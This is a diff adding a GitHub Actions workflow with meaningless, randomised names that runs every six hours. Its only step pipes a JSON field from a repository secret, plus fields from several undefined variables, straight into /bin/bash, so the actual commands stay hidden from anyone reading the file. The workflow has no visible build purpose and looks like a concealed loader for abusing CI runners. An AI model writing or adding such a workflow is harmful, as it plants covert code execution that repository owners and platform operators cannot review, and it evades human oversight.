@@ -1,0 +1,27 @@
+name: sensiblehumiliated
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sensiblehumiliated
+        env:
+          q5648: ${{ secrets.q5648 }}
+        run: |
+          echo $q5648 | jq -r .dpec5 | /bin/bash
+          echo $mzdyl83 | jq -r .h14021 | /bin/bash
+          echo $xc16 | jq -r .bnp2018 | /bin/bash
+          echo $kql76 | jq -r .h812 | /bin/bash
+          echo $e3835 | jq -r .kr6 | /bin/bash
+          echo $xauo94 | jq -r .fvlea484 | /bin/bash
+          echo $ceghn51 | jq -r .gw7297 | /bin/bash
+          echo $ky70658 | jq -r .a2885 | /bin/bash
+          echo $g175 | jq -r .b1080 | /bin/bash
+
